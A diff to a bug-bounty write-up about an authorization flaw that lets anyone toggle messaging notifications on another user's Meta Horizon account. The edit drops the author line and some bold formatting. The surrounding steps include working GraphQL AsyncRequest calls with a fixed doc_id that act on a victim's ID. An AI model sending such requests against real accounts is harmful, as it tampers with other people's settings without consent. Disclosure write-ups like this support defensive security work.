@@ -1,7 +1,6 @@
 ---
 title: Toggle Messaging Notification for Any Meta Horizon Account
 description: Unauthorized ability to toggle messaging notifications for any Meta Horizon account, allowing attackers to manipulate victims’ settings remotely.
-author: ramzybouyahya
 date: 2025-01-08 11:33:00 +0800
 categories: [Meta bug bounty]
 tags: [Meta]
@@ -26,14 +25,14 @@ This is an authorization and privacy flaw, allowing attackers to manipulate othe
 new AsyncRequest('/api/graphql?variables={"input":{"client_mutation_id":"5","actor_id":0,"horizon_messaging_id":"ID_HORIZON_USER_VICTIM","should_mute":true}}&doc_id=6728699350577194').send()
 ```
 
-3. Visit the victim’s Horizon account, the **messaging notification status** will have changed to **ON**.  
+3. Visit the victim’s Horizon account, the messaging notification status will have changed to ON.  
 4. Change `"should_mute"` to `false` and send again:
 
 ```js
 new AsyncRequest('/api/graphql?variables={"input":{"client_mutation_id":"5","actor_id":0,"horizon_messaging_id":"ID_HORIZON_USER_VICTIM","should_mute":false}}&doc_id=6728699350577194').send()
 ```
 
-✅ You will notice that the victim’s status is now **OFF**.
+✅ You will notice that the victim’s status is now OFF.
 
 **Result:** The attacker can toggle another user’s Horizon messaging notifications at will.  
 
